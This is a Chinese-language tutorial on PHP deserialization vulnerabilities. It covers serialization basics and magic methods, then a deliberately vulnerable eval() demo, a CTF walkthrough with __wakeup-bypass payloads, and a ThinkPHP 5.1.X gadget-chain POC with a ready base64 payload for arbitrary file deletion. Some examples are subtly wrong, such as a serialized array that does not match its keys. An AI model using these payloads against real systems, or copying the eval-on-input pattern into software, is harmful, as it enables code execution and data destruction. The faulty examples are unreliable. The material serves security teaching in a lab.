PHP 反序列化漏洞是指当应用程序反序列化不可信数据时，攻击者通过构造恶意数据对象触发任意代码执行、敏感数据泄露或应用行为篡改的安全漏洞。

## 1 PHP 序列化基础概念

PHP 序列化(serialize)是将一个 PHP 数据结构转换为字符串形式的过程

> 简单来说,serialize() 函数可以把一个数组、对象等复杂类型转换成一个字符串,这样就可以将其存储到文件、Session或者通过网络传输给其他服务器等

```php
php
$array = ['a' => 1, 'b' => 2]; 

$str = serialize($array);
// $str = 'a:2:{i:0;i:1;i:1;i:2;}' 
```

> 上面通过序列化,数组被转换成了一个代表数组结构的字符串

反序列化(unserialize)可以将这个字符串再转换回 PHP 的原始数据结构:

```php
php
$array = unserialize($str);
// $array = ['a' => 1, 'b' => 2];
```

> 总之,序列化可以理解为是encode,把PHP数据编码成字符串;反序列化就 decode,将字符串解码回原来的数据

| 操作 | 描述 |
| ---- | ---- |
| 对象 | 类   |
| 方法 | 函数 |
| 属性 | 变量 |

> 对象执行完后会销毁，因此需要序列化

创建一个执行序列化的 php 文件

```
[root@CentOS-76 ~]# cd /var/www/html/
[root@CentOS-76 html]# vim serialize.php
```

```php
<?php
//创建一个类 Test
 class Test
 {
//定义 3 个属性，最后序列化后看一下这 3 个属性序列化后的结果。
 private $a = "private";
 public $b = "public";
 protected $c = "protected";
 }
//创建一个对象，对象是类的实例。
 $test = new Test();
//序列化 test 这个对象
 $data = serialize($test);
//打印序列化后的对象
 echo $data;
?>
```

| 操作                | 描述                               |
| ------------------- | ---------------------------------- |
| Public（公开）      | 可以自由的在类的内部外部读取、修改 |
| Private（私有）     | 只能在这个当前类的内部读取、修改   |
| Protected（受保护） | 能够在这个类和类的子类中读取和修改 |

执行

```
[root@CentOS-76 html]# php serialize.php
O:4:"Test":3:{s:7:"Testa";s:7:"private"  ;s:1:"b";s:6:"public";s:4:"*c";s:9:"protected";}
```

> O:4:"test" #O→Object（对象）4→对象名称长度为 4 个字符
>
> 3 对象属性个数为 3
>
> ```
> {s:7:"Testa";s:7:"private";
> s=string 7=Testa 字节数，Testa 的属性为 private，所以会在 Test 左右各添加一个空白字符，所以长度为 7，第二个值为 Testa 的值 s=string 7=private 字节长度，private 类型的属性名称为类名称+属性名称也就是 Test+a，例如 0x00Test0x00a
> s:1:"b";s:6:"public";
> public 类型的就比较正常 s=string 1=b 字节长度s:4:"*c";s:9:"protected";}
> protected 有点区别 s=string 4=*d protected 则会在属性名称 d 前面加*号然后*的左右各一个空白字节，例如 0x00*0x00d
> ```
>
> 序列化就是把对象转换为字符串进行存储或传输

对序列化后的结果进行反序列化

```
[root@CentOS-76 html]# vim unserialize.php
```

```php
<?php
//定义 data 变量为序列化之后的对象。
 $data = 'O:4:"Test":3:{s:7:" Test a";s:7:"private";s:1:"b";s:6:"public";s:4:" * c";s:9:"protected";}';
//使用 unserialize 将序列化后的字符串进行反序列化，在长度与名称不符合的名称前后加了空格
 $test = unserialize($data);
//通过 var_dump 打印出 test 对象。此时 test 已经从字符串变成了一个对象。
 var_dump($test);
?>
```

执行反序列化文件

```
[root@CentOS-76 html]# php unserialize.php
```

```php
object(__PHP_Incomplete_Class)#1 (4) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "Test"
  [" Test a"]=>
  string(7) "private"
  ["b"]=>
  string(6) "public"
  [" * c"]=>
  string(9) "protected"
}
```

> 可以看到 object name string 4 = Test ，以及对象中的 3 个属性已经还原了

## 2 条件

反序列化参数用户可控
可控参数会传递到危险函数中执行

### 2.1 序列化-魔术方法

> PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法，这些都是 PHP 内置的方法

| 操作           | 描述                                           |
| -------------- | ---------------------------------------------- |
| __construct    | 当一个对象创建时被调用 *                       |
| __destruct     | 当一个对象销毁时被调用 *                       |
| __wakeup()     | 使用 unserialize 时触发 *                      |
| __sleep()      | 使用 serialize 时触发 *                        |
| __call()       | 在对象上下文中调用不可访问的方法时触发 *       |
| __callStatic() | 在静态上下文中调用不可访问的方法时触发         |
| __get()        | 用于从不可访问的属性读取数据                   |
| __set()        | 用于将数据写入不可访问的属性                   |
| __isset()      | 在不可访问的属性上调用 isset() 或 empty() 触发 |
| __unset()      | 在不可访问的属性上使用 unset()时触发           |
| __toString()   | 把类当作字符串使用时触发,返回值需要为字符串 *  |
| __invoke()     | 当脚本尝试将对象作为函数调用时触发             |

> 更多魔术方法详见：
>
> https://www.php.net/manual/zh/language.oop5.magic.php

写一个有魔术方法的 php 文件

```
[root@CentOS-76 html]# vim magic.php
```

```php
<?php
//创建 test 类
class test{
//属性$varr1=free
public $varr1="free";
//自定义方法 echovarr1
public function echovarr1(){
 echo $this->varr1." in echovarr1()<br>";
}
//以下是常用的魔术方法
public function __construct(){
 echo "__construct 当一个对象创建时被调用<br>";
}
public function __destruct(){
 echo "__destruct 当一个对象销毁时被调用<br>";
}
public function __toString(){
 return "__toString 把类当作字符串使用时触发,返回值需要为字符串<br>";
}
public function __sleep(){
 echo "__sleep 使用 serialize 时触发<br>";
 return array('varr1');
}
public function __wakeup(){
 echo "__wakeup 使用 unserialize 时触发<br>";
}
}
//实例化对象，调用__construct()方法，输出__construct
$xuegod = new test(); 
//调用 echovarr1()方法，输出 varr1 "free"
$xuegod->echovarr1(); 
//$xuegod 对象被当做字符串输出，调用__toString()方法，输出__toString
echo $xuegod; 
//$xuegod 对象被序列化，调用__sleep()方法，输出__sleep
$s =serialize($xuegod); 
//$s 首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。
echo unserialize($s); 
//脚本结束会调用__destruct()方法，输出__destruct
//由于反序列化相当于又创建了一个对象，所以脚本结束后会输出两次__destruct
?>
```

浏览器访问

>http://192.168.1.76/magic.php

```
__construct 当一个对象创建时被调用
free in echovarr1()
__toString 把类当作字符串使用时触发,返回值需要为字符串
__sleep 使用 serialize 时触发
__wakeup 使用 unserialize 时触发
__toString 把类当作字符串使用时触发,返回值需要为字符串
__destruct 当一个对象销毁时被调用
__destruct 当一个对象销毁时被调用
```

> 通过 magic.php 页面我们可以判断出魔术方法的触发顺序

### 2.2 序列化漏洞的原理

当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。因为 PHP 允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数，最终导致一个在该应用范围内的任意 PHP 对象注入。

反序列化漏洞出现需要满足两个条件：

>1.unserialize 时参数用户可控
>
>2.参数被传递到方法中被执行，并且方法中使用了危险函数。什么是危险函数？比如 php 代码执行函数、文件读取函数、文件写入函数等等。
制作 payload 文件

```
[root@CentOS-76 html]# vim demo.php
```

```php
<?php
class Test{
 var $free = "demo";
 function __destruct(){
//_destruct()函数中调用 eval 执行序列化对象中的语句
 @eval($this->free);
 }
}
$free = $_GET['free'];
$len = strlen($free)+1;
//构造序列化对象
$ser = "O:4:\"Test\":1:{s:4:\"free\";s:".$len.":\"".$free.";\";}";
// 反序列化同时触发_destruct 函数
$xuegod = unserialize($ser); 
?>
```

>`demo` 为序列化之后的属性，可以理解为把序列化后的数据存储到了 `demo`

>用户提交的参数作为序列化后的字符串参数，进行反序列化时触发__destruct()魔术方法，而魔术方法中使用危险函数 eval()，$this->free 可以调用对象中的 free 属性，所以使 $free = "phpinfo();"; 而 @eval($this->free); 则执行 free 属性中的 php 代码。

浏览器访问，执行 payload

>http://192.168.1.76/demo.php?free=phpinfo()

> payload 注入成功

![浏览器访问，执行 payload](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%89%A7%E8%A1%8C%20payload.png)

## 3 反序列化漏洞实例-ctf

浏览器访问

>http://192.168.1.76/ctf/ctf.php

```php
<?php
class xuegod{
    private $file='ctf.php';
    function __destruct(){
        if(!empty($this->file))
        {
            show_source($this->file);
        }
    }
    function __wakeup(){
        $this->file='ctf.php';
    }
}
if(!isset($_GET['file'])){
    show_source('ctf.php');
}
else{
    unserialize($_GET['file']);
}
//flag in flag.php
?>
```

> 这是一个反序列化 `ctf.php` 的文件
>
> 目标：打印 `flag.php`
>
> 方法：利用反序列化漏洞使 `show_source` 打印 `flag.php`
>
> 可以看到页面通过 show_source 打印了 ctf.php 的源码，所以题目一定是要我们做代码审计，反序列化漏洞的两个必要因素，unserialize 参数可控，show_source 危险函数。

思路

>第一：通过 GET 方式传参序列化后的字符串作为 file 变量的值给 ctf.php
>第二：通过我们构造的 file 变量的序列化字符串让 show_source($this->file)最终的执行结果为show_source(flag.php);

根据目标的 php 源码构造序列化 `flag.php` 的 POC

```
[root@CentOS-76 ~]# vim test.php
```

```php
<?php
class xuegod{
    private $file='flag.php';
}
echo serialize(new xuegod());
?>
```

执行 POC `test.php` 获取字符串

```
[root@CentOS-76 ~]# php test.php
```

```php
O:6:"xuegod":1:{s:12:"xuegodfile";s:8:"flag.php";}
```

> 得到 `flag.php` 的序列化字符串

浏览器访问

>http://192.168.1.76/ctf/ctf.php

构造一个 payload 使 `$file='flag.php';`

```
http://192.168.1.76/ctf/ctf.php?file=O:6:"xuegod":1:{s:12:"xuegodfile";s:8:"flag.php";}
```

由于存在

```php
function __wakeup(){
$this->file='ctf.php';
```

> 这个魔术方法会使 `flag.php` 变回 `ctf.php`
>
> 因此要绕过 `__wakeup()`

修改 payload 的属性的数量为 2（其实只有一个属性）导致异常，绕过 `__wakeup()`

```php
http://192.168.1.76/ctf/ctf.php?file=O:6:"xuegod":2:{s:12:"xuegodfile";s:8:"flag.php";}
```

> 魔术方法不触发，但是代码依然执行
>
> 提交以上 payload 失败

分析 payload ，发现属性 `xuegodfile` 的长度为 12 ，实际只有 10，因此要在 `xuegodfile` 增加两个空白字符 `%00`

构造 payload

```php
http://192.168.1.76/ctf/ctf.php?file=O:6:"xuegod":2:{s:12:"%00xuegod%00file";s:8:"flag.php";}
```

> 注意添加的位置，要在 `xuegod` 两端加

提交 payload

> 成功读取到 `flag.php`

或者用 `\00` ，此时的 `s` 要大写 `S`，表示为二进制

```php
http://192.168.1.76/ctf/ctf.php?file=O:6:"xuegod":2:{S:12:"\00xuegod\00file";s:8:"flag.php";}
```

## 4 ThinkPHP 5.1.X 反序列化任意代码执行

>ThinkPHP 是一个免费开源的，快速、简单的面向对象的 轻量级 PHP 开发框架 ，创立于 2006 年初，遵循 Apache2 开源协议发布，是为了敏捷 WEB 应用开发和简化企业应用开发而诞生的。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多的原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进，已经成长为国内最领先和最具影响力的 WEB 应用开发框架，众多的典型案例确保可以稳定用于商业以及门户级的开发。

浏览器访问

> http://192.168.1.102/think/public/
>
> 代码定义通过 POST 方式接受 key 变量，经过 base64 解码之后进行反序列化。

### 4.1 任意文件删除

### 4.1.1 准备

打开 `C:\phpstudy_pro\WWW\think\public\index.php` ，在末端添加

```
$s = base64_decode($_POST['key']);
unserialize($s);
```

>`ThinkPHP` 本身不存在`反序列化参数用户可控` 这个条件，开发者在其中加入以上业务逻辑就形成了这个条件
>
>此代码是用于接收一个以 POST 方式传递的 key，并进行 base64 解码（利用 key 代码较长，需要进行 base64 编码），最后对解码后的参数进行反序列化
>
>1. 通过$_POST['key']获取POST请求参数key的值。
>2. 使用base64_decode()对key进行base64解码。
>3. 将解码后的结果存储在变量$s中。
>4. 调用unserialize()对$s进行反序列化。
>从代码逻辑看,主要进行了以下操作:
>- 获取base64编码后的key
>- 对key进行base64解码
>- 反序列化解码后的key
>所以这段代码的主要作用是:
>- 对传入的key参数进行base64解码,获取解码后的原始数据
>- 然后对解码后的原始数据进行反序列化

添加完后刷新一下页面，会出现页面错误

![添加完后刷新一下页面，会出现页面错误](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E6%B7%BB%E5%8A%A0%E5%AE%8C%E5%90%8E%E5%88%B7%E6%96%B0%E4%B8%80%E4%B8%8B%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BC%9A%E5%87%BA%E7%8E%B0%E9%A1%B5%E9%9D%A2%E9%94%99%E8%AF%AF.png)

> 由于添加了一个接收参数的代码，而目前并没有传递这个参数，因此报错

在任意路径创建一个文件（不需要是站点目录）

![在任意路径创建一个文件（不需要是站点目录）](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E5%9C%A8%E4%BB%BB%E6%84%8F%E8%B7%AF%E5%BE%84%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%88%E4%B8%8D%E9%9C%80%E8%A6%81%E6%98%AF%E7%AB%99%E7%82%B9%E7%9B%AE%E5%BD%95%EF%BC%89.png)

> 此文件就是要删除的目标文件

### 4.1.2 说明

漏洞存在位置

> C:\phpstudy_pro\WWW\think\thinkphp\library\think\process\pipes\Windows.php

`Windows.php` 中定义了一个 `__destruct` 魔术方法，（此方法在当一个对象被销毁时被执行），此时调用 `close()` 和 `removeFiles()` 方法，`removeFiles()` 为危险函数

```php
 public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
```

>1. `$this->close()` 调用对象内部的close()方法,可能是关闭某些资源,如数据库连接等。
>1. `$this->removeFiles()` 调用对象内部的removeFiles()方法,可能是删除一些文件或清除缓存等。
查找 `removeFiles()` 函数可以看到这个函数中使用了 `$this->files` 而 `files` 是可控的。

```php
private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

>方法逻辑:
>
>1. 遍历 `$this->files` 属性,其中存储着要删除的文件名
>
>2. 对每个文件名,检查文件是否存在
>
>3. 如果存在,则用 `unlink()` 函数删除该文件
>
>4. 最后将 `$this->files` 数组清空可以看出:
>
>5. > 1.  这个方法会遍历删除 `$this->files` 数组中存储的一组文件名对应的文件
>  >
>  > 2. 调用 `unlink()` 函数删除文件
>  >
>  > 3. 最后清空这个数组属性
>  >
>  >   总结:这是一个辅助方法,它被设计用于删除一个对象中管理的一组文件。
>  >
>  >   \- 优点是封装了文件删除的逻辑
>  >   \- 可以重用这个方法进行批量文件删除
>  >   \- 删除后清空文件列表,不会重复删除
>
>  `Filename` 通过 `this->files` 获取文件路径，然后 `file_exists` 判断 `filename` 文件路径是否存在，如果存在则通过 `@unlink` 删除文件。

在 Seay 源代码审计系统打开站点根目录

![在 Seay 源代码审计系统打开站点根目录](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E5%9C%A8%20Seay%20%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E6%89%93%E5%BC%80%E7%AB%99%E7%82%B9%E6%A0%B9%E7%9B%AE%E5%BD%95.png)

在全局搜索搜索 `removeFiles()`

![在全局搜索搜索 removeFiles()](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E5%9C%A8%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%E6%90%9C%E7%B4%A2%20removeFiles().png)

>选择 Windows 中的 `$this->files` 

双击左侧函数，切换至函数所在位置

![双击左侧函数，切换至函数所在位置](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8C%E5%87%BB%E5%B7%A6%E4%BE%A7%E5%87%BD%E6%95%B0%EF%BC%8C%E5%88%87%E6%8D%A2%E8%87%B3%E5%87%BD%E6%95%B0%E6%89%80%E5%9C%A8%E4%BD%8D%E7%BD%AE.png)

查看 `removeFiles()` 的定义

```php
private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

> 可以看到调用了 `files` 变量

查找 `files` 变量

```php
 private $files = [];
```

> 可以看到变量 `$files` 的定义

复制变量 `$files` 所在的类

![复制变量 $files 所在的类](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E5%88%B6%E5%8F%98%E9%87%8F%20$files%20%E6%89%80%E5%9C%A8%E7%9A%84%E7%B1%BB.png)

删除无用的代码

```php
<?php
namespace think\process\pipes;
use think\Process;
class Windows extends Pipes
{
}
```

在 `C:\phpstudy_pro\WWW\think\public\removefile.php` 构造 POC ， 定义 `private $files = [];` 为 `$this->files=['c:\\hello.txt'];` ，定义一个空的 `Pipes` ，并增加 `public function _construct()` 魔术方法

```php
<?php
//引用命名空间和 Pipes 类
namespace think\process\pipes;
use think\Process;
class Pipes{
}
//Windows 类
class Windows extends Pipes
{
//files 属性
private $files = [];
//__construct 魔术方法
public function __construct()
{
//$this->files 属性的值修改为我们要删除的文件
$this->files=['c:\\hello.txt'];
}
}
//base64 输出序列化后的 Windows 对象
echo base64_encode(serialize(new Windows()));
?>
```

>1. 首先是声明了 `namespace` 和 `use` ,表示该类位于 `think\process\pipes` 目录下，并使用了 `think\Process` 类
>2. 定义一个空的 `Pipes` 
>3. 定义了一个 `Windows` 类，继承自 `Pipes` 类
>4. 声明了一个私有属性 `$files`，用于存储要删除的文件列表
>5. 实现了 `__construct()` 构造方法，在构造函数中修改了 `$files` 属性的值，指定了要删除的文件 `c:\hello.txt`
>6. 这个类继承自 `Pipes` 父类，父类中可能实现了文件删除的方法
>7. 所以通过覆盖 `__construct()` 构造函数，可以实现实例化这个类时，自动指定要删除的文件
>8. 当该类的对象实例在程序结束时销毁，可能会触发文件删除操作
>9. 通过 `base64_encode()` 对序列化结果进行 `base64` 编码并打印，这个结果就是 `payload`
>
>这段代码通过继承和覆盖构造函数,实现了一个在对象销毁时自动删除指定文件的功能,相当于是一个便利的辅助类。

浏览器访问

>http://192.168.1.102/think/public/removefile.php

```
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjEyOiJjOlxoZWxsby50eHQiO319
```

>得到 payload

使用 base64 解码验证

```
O:27:"think\process\pipes\Windows":1:{s:34:"think\process\pipes\Windowsfiles";a:1:{i:O;s:12:" c:\hello.txt";}}
```

浏览器访问

>http://192.168.1.102/think/public/

在 HackBar 提交 `Body`

```
key=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjEyOiJjOlxoZWxsby50eHQiO319
```

查看 `c:\hello.txt` 文件，发现已经删除，此时页面变正常

利用链

![利用链](./../../../image/PHP%20%E5%BA%8F%E5%88%97%E5%8C%96/%E5%88%A9%E7%94%A8%E9%93%BE.png)

### 4.2 任意代码执行

反序列化漏洞的常见起点：

> `__wakeup` 一定会调用
> `__destruct` 一定会调用
> `__toString` 当一个对象被反序列化后又被当做字符串使用

反序列化漏洞的常见中间跳板：

> `__toString` 当一个对象被当做字符串使用
> `__get` 读取不可访问或不存在属性时被调用
> `__set` 当给不可访问或不存在属性赋值时被调用
> `__isset` 对不可访问或不存在的属性调用 `isset()` 或 `empty()` 时被调用

反序列化漏洞的常见终点：

> `__call` 调用不可访问或不存在的方法时被调用
> `call_user_func` 一般 php 代码执行都会选择这里
> `call_user_func_array` 一般 php 代码执行都会选择这里

挖掘思路：

> 1. `unserialize` 参数用户可控
> 2. 参数被传递到方法中被执行，并且方法中使用了危险函数（常规思路）
> 3. 魔术方法中没有敏感操作，通过属性调用了其它函数，恰巧在其它类中有同名的函数（pop 链）

